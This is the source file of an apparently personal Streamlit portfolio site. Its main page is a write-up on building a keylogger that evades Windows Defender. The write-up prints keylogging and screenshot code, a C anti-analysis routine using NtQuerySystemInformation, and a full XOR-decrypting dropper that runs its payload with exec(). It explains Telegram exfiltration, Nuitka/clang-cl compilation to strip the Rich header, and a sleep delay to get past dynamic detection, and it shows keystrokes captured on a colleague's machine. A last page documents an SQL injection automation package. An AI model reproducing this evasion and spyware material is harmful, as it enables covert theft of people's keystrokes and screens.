import streamlit as st
#import numpy as np
#import matplotlib.plotply as plt

from datetime import datetime, time
from pathlib import Path


def page_1():
    st.markdown("""
        <style>
            .big-title {
                font-size: 3em;
                font-weight: bold;
                text-align: center;
                margin-bottom: 0.2em;
            }

            .sub-title {
                font-size: 1.3em;
                font-weight: 300;
                text-align: center;
                margin-bottom: 2em;
                color: #cccccc;
            }

            .info-block {
                background-color: #111111;
                padding: 1.5em;
                border-radius: 0.8em;
                margin-bottom: 1.5em;
                border-left: 5px solid #5D001E;
            }

            .info-block h3 {
                margin-top: 0;
                color: #ffffff;
            }

            .info-block p {
                color: #bbbbbb;
                margin-bottom: 0;
            }
        </style>
    """, unsafe_allow_html=True)

    st.markdown('<div class="big-title">Welcome to my projects review</div>', unsafe_allow_html=True)
    st.markdown('<div class="sub-title">From system exploitation to malware development</div>', unsafe_allow_html=True)

    col1, col2, col3 = st.columns(3)

    with col1:
        st.markdown('<div class="info-block">', unsafe_allow_html=True)
        st.markdown("### 🔐 Exploit Lab ")
        st.markdown("""
            - Soon...
        """)
        st.markdown('</div>', unsafe_allow_html=True)

    with col2:
        st.markdown('<div class="info-block">', unsafe_allow_html=True)
        st.markdown("### 👾 Malware Dev")
        st.markdown("""
            - Bypass Windows Defender with Keylogger in python & C
        """)
        st.markdown('</div>', unsafe_allow_html=True)
        
    with col3:
        st.markdown('<div class="info-block">', unsafe_allow_html=True)
        st.markdown("### 🛠️ Tool Project")
        st.markdown("""
            - PuzzleSQL : Python package for custom automated SQL injection (In pause...)
        """)
        st.markdown('</div>', unsafe_allow_html=True)

    st.markdown("<br> <br>", unsafe_allow_html=True)

    st.markdown("""
        <style>
        .custom-text {
            text-align: center;
            font-size: 1.3rem;
            font-weight: 600;
            color: #A42424 ;
            margin-bottom: 1.5rem;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        </style>
    """, unsafe_allow_html=True)
    
    st.markdown('<p class="custom-text">My new project : A malware (keylogger) that can bypass Windows Defender using Nuitka and Clang-cl !</p>', unsafe_allow_html=True)
    
    if st.button("Go to Malware Creation 🧪"):
        st.session_state.selected_page = "Malware Cre[HACK]tion I"
        st.rerun()


    st.markdown("""---""")
    st.markdown(
        "<p style='text-align:center; font-size:0.9em; color: #777;'>"
        "More projects and write-ups will be added ;)"
        "</p>",
        unsafe_allow_html=True
    )

    

                                            ########## Page 2 ##########
def page_2():
    
    st.markdown(
    """
    <div style='background-color:#0e1117;padding:20px;border-radius:10px'>
        <h1 style='color:#00FFAA;text-align:center'>How a python keylogger can bypass Windows Defender ?</h1>
        <p style='color:#CCCCCC;text-align:center'>⚠️ Educational context only - Lab simulation</p>
    </div>
    """,
    unsafe_allow_html=True
)

    st.markdown("<br> <br>", unsafe_allow_html=True)
    
    st.write("""
    :green[Before we begin, let's first talk about the scope. The Windows Defender used is the standard home version with 
    all parameters activated. We will not discuss EDR or other antivirus solutions. Initially, this project aimed to 
    understand how an antivirus like Windows Defender (at home) can be bypassed in order to run malware on the system. 
    Future projects like this will be improved to bypass antivirus solutions as much as possible, using more advanced 
    techniques.]         
             
    """)
    
    
    st.write("""
- ***Language*** : While malware can be written in C/C++, PowerShell, Bash, or VBScript, this implementation uses **Python** for its simplicity and accessibility.
More advanced components (e.g. rootkits) would likely require C/C++ to interact with syscalls. But for our **keylogger**, we stick to Python.

- ***Target OS*** : The testbed environment is a **Windows-based environment**. We restrict our testing and simulations to this OS only.

- ***Functionalities*** :
    - **Keylogging** using Python modules (e.g., `pynput`)
    - **Screenshot capture**
    - **Data exfiltration simulation** (e.g., sending to a Telegram bot)

- ***Attacker-side simulation*** : Logs and screenshots are sent to a **local server or Telegram bot**. We explore the idea of using AI for future parsing but do not implement it at this stage.

- ***Detection & Stealth*** : The key focus of this experience is **evasion**. Building the logger is not the challenge; staying undetected is. Thus, we also investigate:
    - How AV solutions detect Python malware
    - Techniques to reduce the detection surface (e.g., obfuscation, syscall-based execution, etc...)
""")
    
    st.markdown("<h3 style='text-align: center;'>Let's begin this very interesting journey ! </></h3>", unsafe_allow_html=True)
    
    st.write("""
             For the first step, we choose the language. Here the keylogger will use Python for the main functionality.
            Taking screenshots, registering keylogs and sending the photos and logs to a server.
            It will also use functionality like XOR-decryption and will place the file in the TEMP directory. 
            Also, the keylogger will have a dll file written in C. The main purpose here is to provide the virus with AV detection functionalities. 
            We will see that later.             
    """)    
    
    st.markdown("<h2 style='text-align: center;'>Functionalites:</></h2>", unsafe_allow_html=True)

    st.info("Here, we will see what types of functionalites we will use for the keylogger")
    
    st.markdown("<h3 style='text-align: left;'>Keylogging</></h3>", unsafe_allow_html=True)
    
    st.write("""
             
    The keylogger need of course to log every key typed in the keyboard. For that we have several possibilitys.
    We can use hook function in order to intercept the input of the target. For that we can use the API windows. In python
    we have win32 module to use API function by windows. But we will use Pynput module, more especially the keyboard class.
    With that, we can with simplicity, log the key typed by the target in his keyboard. The module use WinAPI, so we need to be 
    careful using it. We have higher chance to trigger the AV. 
    
    The thing we can do, is to use syscall function, undocumented function, used in windows to not trigger the AV. But the main objective
    is using python for the malware.             
             """)
    
    
    keylogger_code = r"""
    def on_press(self, key):
        with open(self.log_file,'a') as f:
            if key  == keyboard.Key.space:
                f.write(' ')
            elif key == keyboard.Key.enter:
                f.write('\n')
            elif key == keyboard.Key.backspace:
                f.write(' *backspace* ')
            else: 
                key_str = str(key).strip("'")
                (f.write(f"{key_str}"))     
    
    """
    
    
    st.warning("Here the python code for the keylogging functionality :")
    
    st.code(keylogger_code, language="python")
    
    st.write("""As you can see, we using pynput library with keyboard class to hook the key pushed by the target.
    I adjusted the function with a few modifications in outputs to help myself read the log file more efficiently. 
    But as you can see, i just converted three key, characters like '&', '@' and so on, will be placed with 
    their proper pynput markup.""")
    
    st.write("""The magic happens around the on_press() function. It will open a file (placed in the TEMP directory) 
    and will append as many keys as are pressed by the target. It will translate when it can, and will remove unnecessary strings like " ' ".
    Threading functions (you can't see them) are used to manage the different functionalities of the malware more correctly.
    start, stop, pause and resume function are used in the main file of the malware to prevent race condition.
    """)
    
    st.info("Now, let's see the second class used by the malware")
    
    sysinfo_code = r"""  
    def os_information(self):
        os_inf_gath = platform.platform()

        file_path = tempfile.gettempdir()  # Exemple => C:\Users\Username\AppData\Local\Temp
        os.makedirs(file_path, exist_ok=True)

        log_file = os.path.join(file_path, self.log_file_name)
        name_target = os.environ.get('COMPUTERNAME')
        with open(log_file,'a') as f:
            timestamp = datetime.datetime.now().strftime("Jour: %Y-%m-%d__Heure: %H-%M-%S")
            f.write(f"---OS INFORMATION -> {os_inf_gath} : {timestamp} => {name_target}\n")
        return log_file
    
    def screen_shot(self):
        os.makedirs(self.screen_file_name, exist_ok=True)
        while True:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            
            screenshot_path = os.path.join(self.screen_file_name, f"screenshot_{timestamp}.png")
            
            screenshot = ImageGrab.grab()
            screenshot.save(screenshot_path)
            print(f"Screenshot saved: {screenshot_path}")
    """
    
    
    st.code(sysinfo_code, language="python")
    
    st.write("""
              This module collects OS information in a file where the keylog will be placed and takes periodic screenshots using PIL.ImageGrab. 
              Like with the keylogger, this is purely simulated in a local lab environment. The main goal here, is to have
              as much information as we can. We can also exfiltrate files and directories but I will not do that for this keylogger..
              Like the first code, we adjust it with new functions in order to prevent race conditions (very important).
             """)
    
    st.info("""Thread function are used due to the use of functions that run continuously.""")
    
    st.warning("Little warning concerning these functions :")
    
    
    st.write("""
    These functions use the pynput module, and pynput uses the Windows API. In other words, this is VERY bad.
    Using Python forces us to use functions through the Windows API. Why is this bad?
    **AV detects it**. AV hooks API functions and will detect if a program runs some of these functions, it make a correlation between the used API
    and the most popular APIs call made by known malware. 
    That's why malware uses undocumented functions, or **syscalls**. **Syscalls** are very important if you want to evade AV.
    But of course, using them with Python is not the best idea; for that, we need to use the C language, but we will see that later. 
    Let's focus on Python code and the pynput module. We are practically shooting ourselves in the foot, but it's a good challenge.
    """)
    
    st.markdown("<h3 style='text-align: center;'>What next ?</h3>", unsafe_allow_html=True)

    st.info("""We have the main function used by the malware, now, we will talk about exfiltration.       
        """)
    
    url = "https://www.cyfirma.com/research/lumma-stealer-tactics-impact-and-defense-strategies/"

    st.write("""Before talking about the C part, we need to see how to exfiltrate our stolen data.
    For that let's see how other viruses work, for exemple [Luma Stealer](%s)
    Lumma Stealer uses a remote C2 (Command & Control) server. For this first malware, we will not do that, due to the objective to make
    the most easiest malware possible to evade Windows AV. For that, we need a server to exfiltrate data, such as web server.
    """ % url)
    
    st.markdown("<h3 style='text-align: center;'>Discord case</h3>", unsafe_allow_html=True)
    
    url ="https://www.cyfirma.com/research/technical-malware-analysis-report-python-based-rat-malware/"
    
    st.write("""
    For example, like in this [Python RAT malware](%s), we can use Discord to exfiltrate data. At first, i was doing this (using Discord webhook), 
    but i encountered a problem while testing my Keylogger **Discord BOT**. They just closed the server for non-compliance with the user charter.
    It's fair enough, but I need a server to exfiltrate the stolen data. For that, and like a lot of malware during a certain time, we will use ***Telegram***.
            """ % url)

    st.markdown("<h3 style='text-align: center;'>Telegram case</h3>", unsafe_allow_html=True)
    
    st.write("""
        In fact, this is a good idea. It's pretty clean, pretty simple to use, and we can access the server from anywhere.
        **BUT**, AV can maybe detected it. We are not talking about Windows Defender (on its own), but some AV and EDR (Endpoint Detection and Response)
        solutions can detect packets sent to Telegram, because of the high usage by malware. 
        So keep in mind that this malware can be used **only** against Windows Defender. 
        One day we will level up, but for now, let's focus on our purpose.
             """)

    st.markdown("<h2 style='text-align: center;'>Exfiltration</h2>", unsafe_allow_html=True)
    
    st.write("""
            To exfiltrate data, we need to send packets to a server. We will use a Telegram bot with the Telegram API to send data. 
            But what format? Stolen data will be files (keyboard logs) and zip files (screenshots). Telegram allows us to send them to a private room. 
            But it's important to understand that in a real scenario, Telegram is not the best choice. Having our own remote server is better. 
            of course, we can use any type of server, even Google Drive or X (Twitter), but in fact, having control over data flow, data processing 
            and so on, is more important. You can look at some well-known malware to see that they generally use their own server. 
             """)
    
        
    st.write("""
             Let's dive into the best part of making malware (and the most difficult): the **EVASION** techniques. 
             """)
    
    st.info("How will we evade Windows Defender for this keylogger ?")
    

    col1, col2, col3 = st.columns(3)

    with col1:
        
        response1 = st.button("Using XOR encryption, Syscall function and obfuscation")
        
        if response1:
            
            st.success("Yes ! Let's have a deepest look into it !")
        

    with col2:
        
        response2 = st.button("Using only full obfuscation and Windows API")
        
        if response2:
            
            st.warning("No...")


    with col3:
        
        response3  = st.button("Using steganography for the dropper and Syscalls functions")
        
        if response3:
            
            st.warning("No...")
    
        
    st.markdown("<h2 style='text-align: center;'>Evasion Techniques</h2>", unsafe_allow_html=True)
    
    st.write("In fact, a lot of techniques can be used, but for this keylogger we will prefer the first choice.")
    
    url3="https://www.hackmosphere.fr/bypass-windows-defender-antivirus-2025-part-1/"
    
    st.write("""
        First of all, you can read further to understand the assignment with this [link](%s). Now let's see how this works.
        First, it's important to understand that we are using different techniques, from XOR to Syscall and passing through obfuscation and even the Clang-cl option on Nuitka. 
        All these techniques will help us evade AV. We cannot use just one and hope that it will work. To evade AV, 
        we need to have different approaches and to keep up with new trends.                 
        """ % url3)
    

    st.markdown("<h3 style='text-align: center;'>Syscall Function</h3>", unsafe_allow_html=True)
    
    url4="https://www.hackmosphere.fr/bypass-windows-defender-antivirus-2025-part-2/"
    
    url5="https://0xpat.github.io/Malware_development_part_2/"
    
    ###REMETTRE LES LIENS
    st.write("""
    Syscalls play a critical role in malware programming, see this [link](%s). As I mentioned earlier, antivirus software often monitors Windows API functions. 
    They hook into these APIs to analyze program behavior during dynamic analysis, and certain API calls can trigger detection. 
    So, to avoid these, you need to use undocumented Windows functions. The function we will make here is a technique used to avoid analysis in our program. 
    When running, before proceeding, it will check if any malware analysis software is in use on the target system. If it's true, the keylogger will stop itself 
    and will not run, in order to avoid analysis.
             """ % url4)
    
    st.write("""
    [Here](%s) you have examples of avoiding malware analysis, outside and inside a sandbox. 
    The best technique shown in the paper is to detect physical components inside the system you are running on. 
    For example, a sandbox used by AV will have two CPUs. So, if the code finds less than two running CPUs, it will stop its execution. 
    For our project, we will choose something different. The malware will first examine all the running processes and 
    compare the program names with a blacklist. In case of a match, the execution will stop immediately. 
    But to do this, we will use the C language. We could use Windows API and play with these functions, 
    but the risk is that AV will detect it. We are already using WIN API for the keylogging, so we need to do something different now. 
    In addition, this is one of the first executions, so we need to be discreet. Let's use Syscall!             
    """% url5) 
    
    
    syscall_evasion_code =r"""
    int main() {
        HMODULE hNtdll = LoadLibraryA("ntdll.dll");

        typedef NTSTATUS (WINAPI *NtQuerySystemInformation_t)(
            ULONG SystemInformationClass,
            PVOID SystemInformation,
            ULONG SystemInformationLength,
            PULONG ReturnLength
        );

        NtQuerySystemInformation_t NtQuerySystemInformation =
            (NtQuerySystemInformation_t)GetProcAddress(hNtdll, "NtQuerySystemInformation");

        ULONG bufferLength = 1024 * 1024;
        PVOID buffer = malloc(bufferLength);
    
        ULONG returnLength = 0;

        NTSTATUS status = NtQuerySystemInformation(SystemProcessInformation, buffer, bufferLength, &returnLength);
        PSYSTEM_PROCESS_INFORMATION current = (PSYSTEM_PROCESS_INFORMATION)buffer;
        
        const wchar_t* list_tools_analysis[] = {
            L"ida.exe",
            L"procexp.exe",
            L"windbg.exe",
            ...
            NULL
        };
        while (TRUE) { 
                for (int i =0;  list_tools_analysis[i] != NULL; i++){    
                    if (current->ImageName.Buffer != NULL) {
                        wchar_t* filename = wcsrchr(current->ImageName.Buffer, L'\\');
                        if (filename) filename++; else filename = current->ImageName.Buffer;
                        if (wcsicmp(filename, list_tools_analysis[i]) == 0) {
                            free(buffer);
                            return FALSE; //Will return FALSE and stop the execution
                        }
                    } 
                current = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)current + current->NextEntryOffset);

        }
 
        return 0;
    }    
    """
    
    
    st.code(syscall_evasion_code,language="c")   
    
    
    st.write("""
    The code was pretty hard to use; thankfully, I was helped by Google and AI to make it correctly. 
    There are also tools like SysWhisper2 that provide pre-built Syscalls. You will find documentation about Syscall in the complementary sources section. 
    As you can see, it will compare with the blacklist manually incorporated in the main code.
    
    The main difference between API call and Syscall call, is that the programm use directly the ntdll.dll file. We 'bypass" the API monitor
    to get directly the function we want. See the previous link or direclty into the *Complementary Source* to go further into Undocumentend Function.   
    
    Let's see how it looks when executed.
    """)
        
    
    ROOT_DIR = Path(__file__).resolve().parents[1]  
    video_av_evasion = ROOT_DIR / "video" / "video_poc_protection.mp4"
    
    st.video(str(video_av_evasion), loop=True, muted=True)  

    st.success("It work perfectly !")  
    
    
    st.markdown("<h3 style='text-align: center;'>Bypassing the Static Analysis</h3>", unsafe_allow_html=True)
    
    st.write("""
    Here is the part changed everything when i created the keylogger. In first , i used Pyinstaller to make an "wrapper" of my python code.
    And windows triggered it, sometimes not, but for a short period of time (few hours) before it got stopped when executed. So i chose another tool, 
    **Nuitka**. Using it with default parameters was not the best option at first place. With basic compilation using CL compiler and with only obfuscation in the python code,
    the executable triggered the AV each time i compile it, so i can't even see the file being created in the directory !
             """)
    
    ROOT_DIR = Path(__file__).resolve().parents[1]  
    image_poc_1 = ROOT_DIR / "image" / "cl_bad_compiler.jpg"
    st.image(str(image_poc_1), caption="Traduction and Compilation with Nuitka using CL compilator")
    
    st.write("""
    As you can see, using cl compiler, even if we use code obfuscation in the python code, will not work. But why ?
    - First : Using only python code obfuscation is not enought. For the keylogger, we can't just inject junk code or change the variable etc... Here is an exemple of how it looks :             
    """)
    
    
    python_code_obfuscation = """
    
    iiiIIIiiIIiiI = 1
    
    for iiiIIIiiIIiiI =1:
        OOoooOOoOo= 2
        pass
    
    for OOoooOOoOo + iiiIIIiiIIiiI = 2:
        continue
    else:
        IiiIIIiiII = 5
    
    def main():
        main code
        ...
        iiiIIIiiIIiiI = 1
    
    for iiiIIIiiIIiiI =1:
        OOoooOOoOo= 2
        pass
    
    for OOoooOOoOo + iiiIIIiiIIiiI = 2:
        continue
    else:
        IiiIIIiiII = 5
    """
    
    st.code(python_code_obfuscation, language="python")
    
    url6="https://www.hackmosphere.fr/bypass-windows-defender-antivirus-2025-part-2/"
    
    st.write("""
    The code have junk code but we need more in term of obfuscation. The main thing that change everything it using [XOR encryption](%s).
    To make it right, we will use a dropper. The dropper will be the code that executes the main code of the malware. It will search for files and
    execute them directly into the code (like i explain before). It will be the executable file, the others will remain XORed file. 
    We will se that later ! Let's focus into the compilation problem.
             """ % url6)
    
    
    st.markdown("<h3 style='text-align: center;'>Nuitka, Clang and LLVM</h3>", unsafe_allow_html=True)

    url_forum="https://github.com/Nuitka/Nuitka/issues/2163"
    st.write("""
    The obfuscation problem still remains because of the compilation using nuitka and CL (windows compilator). For that, we will use an 'LLVM-based'
    compilator. It will use the front-end of it and this will be a game changer, this is *--clang* option in Nuitka. 
    Here we're going deep in the PE format file on windows, so take a look in sources complentary to go further.
    **When using cl compilator with Nuitka, Windows Defender always detect it, even before stop to finish the compilation, a reel blocage.**
    First, with the default parameter, when compilation working, AV flagged the dropper with this message: Program:Win32/Wacapew.C!ml
    Searching on forum, article etc... I found that sometimes, even with legitimate software, windows can be trigged. Like this [one](%s).
    Keep in mind that it's a 2023 forum. 
    """ % url_forum)

    url_forum_2="https://github.com/actions/runner-images/issues/9403"

    st.write("""Like the guy in the forum, i was using nuitka with default compilator (cl.exe), and i had a clue. Microsoft toolset when compilating creates
    a Rich header on the PE file. This rich header, in addition with other static analysis techniques, can be used to match with malware.
    As an exemple you can see [someone](%s) using clang-cl in Visual Studio, so with microsoft toolset, so with Rich Header in the executable, and it still be triggered by
    the windows defender. So i go deeper into the rich header and i found that it serve to know information in the PE format, like the technologies (import
    resources, language used) in it, or even scope of the project and that how Rich header can be used as a signature or fingerprint, in addition with fuzzyhash and fuzzy imphash for exemple.
    """ % url_forum_2)
    
    st.write("""
    But with nuitka and the *--clang* option, i was astonished to found that the Rich header doesn't exist at all. With PE-Bear i analysed the dropper
    (only executable file of the malware) and the Rich Header is unvailable, because of the use of clang-cl compilator (no Microsoft toolset),
    even if we running it in a windows environment. The Clang-CL compilor will not place windows artifacts like Rich Header.     
             """)
    
    ROOT_DIR = Path(__file__).resolve().parents[1]  
    pe_bear = ROOT_DIR / "image" / "pe_bear.jpg"
    st.image(str(pe_bear), caption="The Rich header hash is not available, because the ReaderHash doesn't exist")

    st.markdown("<h3 style='text-align: center;'>Dynamic problem</h3>", unsafe_allow_html=True)
    
    
    ROOT_DIR = Path(__file__).resolve().parents[1]  
    screenshot3 = ROOT_DIR / "image" / "Capture d'écran 2025-07-16 125957.png"
    st.image(str(screenshot3), caption="Windows Defender dectects dynamically the malware for the first time")

    ROOT_DIR = Path(__file__).resolve().parents[1]  
    screenshot4 = ROOT_DIR / "image" / "Capture d'écran 2.png" 
    
    st.image(screenshot4, caption="It's the exact same dropper but with a different security message...")
    
    st.write("""
    In first, even before using clang, the malware was a one-file type. But i quickly saw  that it would always be triggered because of the
    obvious behavior of the malware. So i needed to change the functioning. For that i split the malware into five files: two for the main 
    functions (keylogging and telegram sending) and two other for the protection function against analysis and for the main file (the orchestrator), the dropepr.
    The dropper is the fifth file, the only executable file, the other are just XOR encrypt files. The dropper will 
    deXOR files and run them "inside itself", in other words, run them during execution with an exec() (Python) function. 
    With that, we can bypass static analysis AND dynamic analysis (in a certain way). 
             """)
    
    st.write("""
    At first, the malware worked in my lab. I was happy and very excited to right this report. But, when i tested it on another computer, 
    Windows Defender triggered it directly because of DYNAMIC analysis (again...). I was lost, how can i make this virus (using **Windows API**) as
    descrete as possible ?? I started to look some techniques, maybe using Syscall for all the functions using Windows API, but i was far from that.
    So i started to play with the behavior of the malware. I added a simple *time.sleep(20)* in the dropper to see if it would work.
    And miraculously, Windows Defender wasn't able to detect it, even after few days. So we can confirm that statically, the keylogger bypasses Windows Defender.
    And now, with the waiting time, it can bypass dynamic analysis performed by Windows Defender.
    
    It's legitimate to know which configuration i used with Windows Defender, in fact everything was on, even the protection against ransomware
    but with the default parameters (of course). So running from the desktop will trigger nothing (not the same story into the documents directory, 
    AV will detect that an executable is playing with files and directory, but will not flag it as malware).
    The only disable parameter is the smart app control (i wasn't able to activate it). 
    
    **Now, i'm happy to show you the keylogger !** Tested on my colleague's computer
             """)
    
    ROOT_DIR = Path(__file__).resolve().parents[1]  
    video_keylogger_in_action= ROOT_DIR / "video" / "New_proof_20s_malware.mp4"
    
    st.video(str(video_keylogger_in_action), loop=True, muted=True) 
    
    st.markdown("<h2 style='text-align: center;'>Screenshot data</h2>", unsafe_allow_html=True)

    st.write("After 15min, the malware send to my telegram server the keylog and the screenshots in a zip file :")
    
    col1, col2 = st.columns(2)

    with col1:
        ROOT_DIR = Path(__file__).resolve().parents[1]  
        screenshot1 = ROOT_DIR / "image" / "screenshot1.png"
        st.image(str(screenshot1), caption="Screenshot during internet research")

    with col2:
        ROOT_DIR = Path(__file__).resolve().parents[1]  
        screen_certi = ROOT_DIR / "image" / "screen_certi.png"
        st.image(str(screen_certi), caption="Another screenshot")
        
    
    st.markdown("<h2 style='text-align: center;'>Keylog data</h2>", unsafe_allow_html=True)
    st.write("During the execution, the malware registered the key used by the target :")
    
    proof_keylog=r"""
    ---OS INFORMATION -> Windows-11-10.0.26100-SP0 : Jour: 2025-07-10__Heure: 15-49-40 => DL5420
http debugger
certfi *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace* hello this is a other test !!! :) 
*backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  
*backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  
*backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace*  *backspace* certi
Key.cmdKey.tabjhgjygyjgjKey.esc
    """
        
    st.code(proof_keylog)    

    
    
    st.write("""It's horrible to read, i was to lazy to write a code to convert it into a readable text, 
    so with LLM and manually, i changed the original file and got this. Using LLM can be intersting for files with a lot of data.""")
    
    proff_keylog_stealh="""OS INFORMATION -> Windows-11-10.0.26100-SP0
    Jour : 2025-07-10
    Heure : 15-49-40
    Name's target => DL5420

    *During research on browser* => http debugger
    *Search a certificate* => certfi
    hello this is a other test !!! :)
    *Management of certifications in order to use http_debugger* => certi
    *???* => Key.cmdKey.tabjhgjygyjgjKey.esc
    """
    st.code(proff_keylog_stealh)
    
    st.write("As you can see, we can elaborate an understanding of what the target doing with screenshot AND keylogs.")
    
    
    st.markdown("<h3 style='text-align: center;'>Why it's work ?</h3>", unsafe_allow_html=True)


        ###A COMPLETER
    st.write("""
    :green[One : PE HEADER FORMAT]
    
    Without the Rich Header, Windows Defender loses an identifier fragment, it can't make a relation (around the compilation chain) between
    the program and known malware for exemple. At this point, i didn't find information about why i can bypass 
    Windows Defender without the Rich Header, maybe this PE header fragment has no importance during static analysis (performed by Windows Defender). 
    At this stage, it's more  a deduction than a certainty, so take it with a pinch of salt. 
    
    
    :green[Two : OBFUSCATION CODE:]
    
    The second possiblity is the use of LLVM front-end. The C code (traduce by Nuitka from the python source code) will be transform
    in a Intermediate Representation and it can help to obfuscate the code. Nuitka will "traduce" the python code using libpython and the 
    intermediate code is very hard to read. It can be use as an obfuscation, additionally, the junk code will help because it will be also 
    "traduce" by Nuitka. But the thing is, only the dropper is compilate, and that's
    why our third hypothesis is...
    
      
    :green[Three : NUITKA, C and LIBPYTHON:]
    
    The traduce-by-Nuitka dropper will use libpython for interpreting the code. It will execute it direclty into the memory, 
    that can bypass AV detection. Windows Defender (in our scope) is file-dependent and need visibility to avoid threat. That why
    the dynamic code can easily bypass the AV. 
    
    :green[Four: TECHNIQUE IMPORT:]
    
    To import module, i used importlib. He will import library dynamically, so during the code execution. You will see how it works below 
    with the dropper code. 
    
    :blue[Of course, the technic used previously in order to bypass dynamic analysis helped a lot. The mixe of all theses technics 
    make the python malware, capable to bypass a Windows Defender at home.]
    
             """)
    
    code_dropper ="""
    from pathlib import Path
    import importlib
    import tempfile


    misterio = ['o'+'s','sy'+'s']
    o = importlib.import_module(misterio[0])
    sss = importlib.import_module(misterio[1])

    import os, sys

    def get_data_path(filename):
        if getattr(sys, 'frozen', False):
            return os.path.join(sys._MEIPASS, filename)
        return os.path.join(os.path.abspath("."), filename)


    def xor_dec(data: bytes, key: bytes) -> bytes:
        return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

    yek = 'SHAD0WKEY'.encode()
    temp_path = get_data_path(tempfile.gettempdir())

    repertoire = Path(get_data_path("game_saved"))


    for fichier in repertoire.iterdir():
        
        if ".xor" in fichier.name:
            
            with open(fichier, "rb") as f:
                encrypted = f.read()
                decrypted = xor_dec(encrypted, yek)
                
                    
            file_name_nom = fichier.name.replace(".xor", ".py")
            chemin_sortie = Path(temp_path) / file_name_nom
            
            with open(chemin_sortie, "wb") as out:
                out.write(decrypted)
                
    call_path = get_data_path("danse_with_me.xor")   
            
    with open(call_path, "rb") as f:
        
                encrypted = f.read()
                
                decrypted = xor_dec(encrypted, yek)
                
    file_name_nom = call_path.replace(".xor", ".dll")

    chemin_sortie = get_data_path(Path(".") / file_name_nom)

    with open(chemin_sortie, "wb") as out:
        out.write(decrypted)            
                
    loader = get_data_path("rename_game.xor")

    with open(loader, "rb") as f:
            encrypted = f.read()
            
    decrypted = xor_dec(encrypted, yek)

    exec(decrypted.decode("utf-8"))
    """
    st.code(code_dropper, language="python")    


    
    
    
    
    ### Source Side
    source1="https://www.gdatasoftware.com/blog/2020/05/36068-current-use-of-virtual-machine-detection-methods"
    source2="https://andreafortuna.org//2018/05/21/malware-vm-detection-techniques-evolving-an-analysis-of-gravityrat/"
    source3="https://0xpat.github.io/"
    source4="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FSystem%20Information%2FNtQuerySystemInformation.html"
    source5="https://learn.microsoft.com/fr-fr/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation"
    source6="https://0xpat.github.io/Malware_development_part_2/"
    source7="https://www.hackmosphere.fr/bypass-windows-defender-antivirus-2025-part-2/"
    source8="https://offwhitesecurity.dev/malware-development/portable-executable-pe/rich-header/"
    source9="https://0xrick.github.io/win-internals/pe3/#rich-header"
    source10="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format"
    source11="https://www.virusbulletin.com/virusbulletin/2020/01/vb2019-paper-rich-headers-leveraging-mysterious-artifact-pe-format/"
    source12="https://connect.ed-diamond.com/misc/misc-121/analyse-statique-des-executables-windows-la-structure-pe"
    
    st.markdown("<h3 style='text-align: center;'>Complementary Sources</h3>", unsafe_allow_html=True)
    st.write(f""" 
             
    *General Techniques for malware writing*
    - {source3}
    - {source7}
             
    *Evasion Techniques using hardware analysis* : 
    - {source1}        
    - {source2}
    - {source6}
    
    *Syscall Function*
    - {source4}
    - {source5}
    
    *Static Analysis (PE Header, Rich header, Clang...)*
    - {source8}
    - {source9}
    - {source10}
    - {source11}
    - {source12}
             
             
             
             """)



                    ################### Page 3 ########################
                    
                    
                    
                    
                    
                    
def page_3():
    st.title("PuzzleSQL : Package to automate your SQL injection 💉")
    st.write("This page is the documentation page of the PuzzleSQL package available in my github")
    st.markdown(
        """
        **PuzzlesSQL** is a Python package designed to simplify and speed up the automation of SQL injections (SQLi). It offers pre-built functions that users can assemble to create custom scripts. Currently, it supports time-based and error-based SQL injections, with plans to expand to other types of SQL injections in the future.
        """
    )

    st.markdown("[Link to GitHub repository](https://github.com/Fournoy/PuzzlesSQL)")

    st.subheader("Main Features")
    st.markdown(
        """
        - **SQL Injection Automation**: Provides functions to automate time-based and error-based SQL injections.
        - **Customization**: Users can assemble functions like puzzle pieces to create scripts tailored to their specific needs.
        - **Evolving Support**: Plans to extend support to other types of SQL injections in the future. :red[Also, i will extend the package to use 
        bypass WAF technics and out-of-band SQL injection with DNS/HTTP server.] 
        """
    )
    
    st.subheader("What else does PuzzleSQL offer ? ")
    st.write("""Apart for its automated SQLi functionality (not like SQLmap!), PuzzleSQL use binary search. 
            Binary search is a computer technique used to perform searches by dividing data into two parts, based on the position of the “middle”.
            One of the two halves is eliminated, and this is why we gain time. When we study the computational complexity of the binary search
            we can see that we have a O egal to log(2n). The linear search have a O egal to n. For high number of value, the binary search is better
            than the linear search. Especially for Blind SQLi when we try to take a password or information.
             """)
    """
    col1, col2 = st.columns(2)
    
    with col1:
        def calcul_log(n):
            return np.log(2 * n)

        st.subheader("Graphics for log(2n)")
        n_max = 20
        n_values = np.arange(1, n_max + 1)
        log_values = calcul_log(n_values)

        fig, ax = plt.subplots()
        ax.plot(n_values, log_values, label="log(2n)", color="blue")
        ax.set_xlabel("n")
        ax.set_ylabel("log(2n)")
        ax.set_title("Graphic of log(2n)")
        ax.grid()
        st.pyplot(fig)
    with col2:
        def calcul_linear(n):
            return n

        st.subheader("Graphics for n")
        n_max = 20
        n_values = np.arange(1, n_max + 1)
        log_values = calcul_linear(n_values)

        fig1, ax1 = plt.subplots()
        ax1.plot(n_values, log_values, label="n", color="blue")
        ax1.set_xlabel("n")
        ax1.set_ylabel("n")
        ax1.set_title("Graphic of n")
        ax1.grid()
        st.pyplot(fig1)
    """
     
    st.markdown("<h2 style='text-align: center;'>Good ! Now, let's explain how to use and how work the PuzzleSQL package ! 🧑‍💻</h2>", unsafe_allow_html=True)
    
    st.write("""PuzzleSQL offer different function to make SQL injection. FOr exemple, you can make time based SQLi and boolean_based SQLi.
    But what if i want to make an error SQLi, and look at the content of the web page for the process ? Unfortunately, this is not avalaible yet
    in PuzzleSQL, but i will make this as soon as possible. """)  
        
    ##########################################################################
    #Binary function explanation 

    st.subheader("The binary search function : 🧮")
